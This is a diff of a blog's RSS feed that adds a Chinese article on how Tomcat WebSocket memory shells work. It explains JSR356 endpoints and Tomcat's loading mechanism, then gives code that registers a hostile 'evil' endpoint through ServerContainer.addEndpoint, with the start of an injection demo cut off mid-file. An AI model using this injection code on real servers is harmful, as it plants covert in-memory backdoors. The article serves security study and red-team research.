@@ -23,10 +23,361 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Wed, 20 Jul 2022 14:04:40 &#43;0800</lastBuildDate>
+        <lastBuildDate>Wed, 27 Jul 2022 18:54:24 &#43;0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss&#43;xml" href="https://blog.wh1sper.com/rss.xml" />
         
+        
+            <item>
+                <title>Tomcat WebSocket内存马原理浅析</title>
+                <link>https://blog.wh1sper.com/posts/tomcat-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</link>
+                <guid isPermaLink="true">https://blog.wh1sper.com/posts/tomcat-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</guid>
+                <pubDate>Tue, 19 Jul 2022 00:58:30 &#43;0800</pubDate>
+                
+                    <author>pwned@qq.com (wh1sper)</author>
+                
+                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
+                
+                    <description>&lt;p&gt;本文首发跳跳糖：&lt;a href=&#34;https://tttang.com/archive/1673/&#34;&gt;《Tomcat WebSocket内存马原理浅析》&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;周末和N1k0la师傅看到了这个repo：&lt;a href=&#34;https://github.com/veo/wsMemShell&#34;&gt;wsMemShell&lt;/a&gt;，决定来研究一番。&lt;/p&gt;
+&lt;p&gt;正好某大行动要开始了，希望此文能抛砖引玉，给师傅们带来一些启发。文章写的不好，疏漏之处细节欢迎师傅们指正。&lt;/p&gt;
+&lt;h2 id=&#34;tomcat-websocket的实现&#34;&gt;Tomcat WebSocket的实现&lt;/h2&gt;
+&lt;p&gt;Tomcat自7.0.2版本开始支持WebSocket，采用自定义API，即WebSocketServlet。&lt;/p&gt;
+&lt;p&gt;从2013年有了&lt;code&gt;JSR356&lt;/code&gt;标准之后，Tomcat自7.0.47版本废弃自定义的API，实现了Java WebSocket规范（JSR356 ）&lt;/p&gt;
+&lt;p&gt;根据JSR356规定， 建立WebSocket连接的服务器端和客户端，两端对称，可以互相通信。把通信端点抽象成类，就是&lt;code&gt;Endpoint&lt;/code&gt;，每一个Endpoint对象代表WebSocket链接的一端，服务器端的叫&lt;code&gt;ServerEndpoint&lt;/code&gt;，客户端的叫&lt;code&gt;ClientEndpoint&lt;/code&gt;。客户端向服务端发送WebSocket握手请求，建立连接后就创建一个&lt;code&gt;ServerEndpoint&lt;/code&gt;对象。&lt;/p&gt;
+&lt;p&gt;ServerEndpoint和ClientEndpoint，有相同的生命周期事件（OnOpen、OnClose、OnError、OnMessage），不同之处是ServerEndpoint作为服务器端点，可以指定一个URI路径供客户端连接，ClientEndpoint则没有。&lt;/p&gt;
+&lt;p&gt;Endpoint对象的生命周期方法如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;onOpen：当开启一个新的会话时调用。这是客户端与服务器握手成功后调用的方法，等同于注解@OnOpen。&lt;/li&gt;
+&lt;li&gt;onClose：当会话关闭时调用。等同于注解@OnClose。&lt;/li&gt;
+&lt;li&gt;onError：当链接过程中异常时调用。等同于注解@OnError。&lt;/li&gt;
+&lt;li&gt;onMessage：接收到消息时触发。等同于注解@OnMessage&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;服务端实现endpoint的方式&#34;&gt;服务端实现Endpoint的方式&lt;/h3&gt;
+&lt;p&gt;服务器端的&lt;code&gt;Endpoint&lt;/code&gt;有两种实现方式，一种是注解方式&lt;code&gt;@ServerEndpoint&lt;/code&gt;，一种是继承抽象类&lt;code&gt;Endpoint&lt;/code&gt;。&lt;/p&gt;
+&lt;h4 id=&#34;注解方式serverendpoint&#34;&gt;注解方式：@ServerEndpoint&lt;/h4&gt;
+&lt;p&gt;官方文档：&lt;a href=&#34;https://docs.oracle.com/javaee/7/api/javax/websocket/server/ServerEndpoint.html&#34;&gt;ServerEndpoint (Java(TM) EE 7 Specification APIs)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;一个@ServerEndpoint注解应该有以下元素：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;value&lt;/code&gt;：必要，String类型，此Endpoint部署的URI路径。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;configurator&lt;/code&gt;：非必要，继承ServerEndpointConfig.Configurator的类，主要提供ServerEndpoint对象的创建方式扩展（如果使用Tomcat的WebSocket实现，默认是反射创建ServerEndpoint对象）。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;decoders&lt;/code&gt;：非必要，继承Decoder的类，用户可以自定义一些消息解码器，比如通信的消息是一个对象，接收到消息可以自动解码封装成消息对象。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;encoders&lt;/code&gt;：非必要，继承Encoder的类，此端点将使用的编码器类的有序数组，定义解码器和编码器的好处是可以规范使用层消息的传输。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;subprotocols&lt;/code&gt;：非必要，String数组类型，用户在WebSocket协议下自定义扩展一些子协议。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;比如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@ServerEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws/{userId}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encoders&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MessageEncoder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decoders&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MessageDecoder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configurator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MyServerConfigurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;@ServerEndpoint可以注解到任何类上，但是想实现服务端的完整功能，还需要配合几个生命周期的注解使用，这些生命周期注解只能注解在方法上：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;@OnOpen&lt;/code&gt; 建立连接时触发。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@OnClose&lt;/code&gt; 关闭连接时触发。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@OnError&lt;/code&gt; 发生异常时触发。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@OnMessage&lt;/code&gt; 接收到消息时触发。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;继承抽象类endpoint&#34;&gt;继承抽象类：Endpoint&lt;/h4&gt;
+&lt;p&gt;继承抽象类&lt;code&gt;Endpoint&lt;/code&gt;，重写几个生命周期方法，实现两个接口，比加注解 &lt;code&gt;@ServerEndpoint&lt;/code&gt;方式更麻烦。&lt;/p&gt;
+&lt;p&gt;其中重写&lt;code&gt;onMessage&lt;/code&gt;需要实现接口&lt;code&gt;jakarta.websocket.MessageHandler&lt;/code&gt;，给Endpoint分配URI路径需要实现接口&lt;code&gt;jakarta.websocket.server.ServerApplicationConfig&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;而&lt;code&gt;URI path&lt;/code&gt;、&lt;code&gt;encoders&lt;/code&gt;、&lt;code&gt;decoders&lt;/code&gt;、&lt;code&gt;configurator&lt;/code&gt;等配置信息由&lt;code&gt;jakarta.websocket.server.ServerEndpointConfig&lt;/code&gt;管理，默认实现&lt;code&gt;jakarta.websocket.server.DefaultServerEndpointConfig&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;通过编程方式实现Endpoint，比如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;serverEndpointConfig&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebSocketServerEndpoint3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws/{userId}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;decoders&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decoderList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;encoders&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encoderList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;configurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MyServerConfigurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;tomcat-websocket的加载&#34;&gt;Tomcat WebSocket的加载&lt;/h2&gt;
+&lt;p&gt;Tomcat提供了一个&lt;code&gt;javax.servlet.ServletContainerInitializer&lt;/code&gt;的实现类&lt;code&gt;org.apache.tomcat.websocket.server.WsSci&lt;/code&gt;。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ServletContainerInitializer（SCI） 是 Servlet 3.0 新增的一个接口，主要用于在容器启动阶段通过编程风格注册Filter, Servlet以及Listener，以取代通过web.xml配置注册。这样就利于开发内聚的web应用框架.&lt;/p&gt;
+&lt;p&gt;具体可看：&lt;a href=&#34;https://blog.csdn.net/lqzkcx3/article/details/78507169&#34;&gt;Servlet3.0研究之ServletContainerInitializer接口&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;因此&lt;strong&gt;Tomcat的WebSocket加载是通过SCI机制完成的&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;WsSci可以处理的类型有三种：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;添加了注解@ServerEndpoint的类&lt;/li&gt;
+&lt;li&gt;Endpoint的子类&lt;/li&gt;
+&lt;li&gt;ServerApplicationConfig的实现类&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Tomcat在Web应用启动时会在StandardContext的startInternal方法里通过 WsSci 的onStartup方法初始化 Listener 和 servlet，再扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类&lt;/p&gt;
+&lt;p&gt;如果当前应用存在ServerApplicationConfig实现，则通过ServerApplicationConfig获取Endpoint子类的配置（ServerEndpointConfig实例，包含了请求路径等信息）和符合条件的注解类，通过调用addEndpoint将结果注册到WebSocketContainer上；如果当前应用没有定义ServerApplicationConfig的实现类，那么WsSci默认只将所有扫描到的注解式Endpoint注册到WebSocketContainer。因此，如果采用可编程方式定义Endpoint，那么必须添加ServerApplicationConfig实现。&lt;/p&gt;
+&lt;p&gt;然后startInternal方法里为ServletContext添加一个过滤器&lt;code&gt;org.apache.tomcat.websocket.server.WsFilter&lt;/code&gt;，它用于判断当前请求是否为WebSocket请求，以便完成握手（所以任何Tomcat都可以用&lt;a href=&#34;https://github.com/c0ny1/java-memshell-scanner&#34;&gt;java-memshell-scanner&lt;/a&gt;看到WsFilter）。&lt;/p&gt;
+&lt;h2 id=&#34;tomcat-websocket内存马的实现&#34;&gt;Tomcat WebSocket内存马的实现&lt;/h2&gt;
+&lt;p&gt;我们先来回顾一下servlet-api型内存马的实现步骤，拿Filter型举例：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;获取当前的StandardContext&lt;/li&gt;
+&lt;li&gt;创建恶意Filter&lt;/li&gt;
+&lt;li&gt;创建filterDef封装Filter对象，调用StandardContext.addFilterDef方法将filterDef添加到filterDefs&lt;/li&gt;
+&lt;li&gt;创建filterMap将URL和filter进行绑定，调用StandardContext.addFilterMapBefore方法将filterMap添加到filterMaps中&lt;/li&gt;
+&lt;li&gt;获取filterConfigs变量，并向其中添加filterConfig对象&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;既然要插入恶意Filter，那么我们就需要在Tomcat启动过程中寻找添加FIlter的方法，而filterDef、filterMap、filterConfigs都是StandardContext对象的属性，并且也有相应的add方法，那么我们就需要先获取StandardContext，再调用相应的方法。&lt;/p&gt;
+&lt;p&gt;WebSocket内存马也很类似，上一节提到了WsSci 的onStartup扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类，并且调用addEndpoint方法注册到WebSocketContainer上。那么我们应该从WebSocketContainer出发，而WsServerContainer是在StandardContext里面创建的，那么，显而易见的：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;获取当前的StandardContext&lt;/li&gt;
+&lt;li&gt;通过StandardContext获取ServerContainer&lt;/li&gt;
+&lt;li&gt;定义一个恶意类，并创建一个ServerEndpointConfig，给这个恶意类分配URI path&lt;/li&gt;
+&lt;li&gt;调用ServerContainer.addEndpoint方法，将创建的ServerEndpointConfig添加进去&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;container&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evil&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;container&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;demo&#34;&gt;demo&lt;/h3&gt;
+&lt;p&gt;将注入内存马的操作放在static块，加载这个类即可实现内存马注入&lt;/p&gt;
+&lt;p&gt;evil.java:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.catalina.core.StandardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.catalina.loader.WebappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.tomcat.websocket.server.WsServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.*&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.server.ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.server.ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.InputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;evil&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Endpoint&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MessageHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Whole&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;WebappClassLoaderBase&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;webappClassLoaderBase&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;currentThread&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getContextClassLoader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;StandardContext&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;standardContext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;StandardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;webappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getResources&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
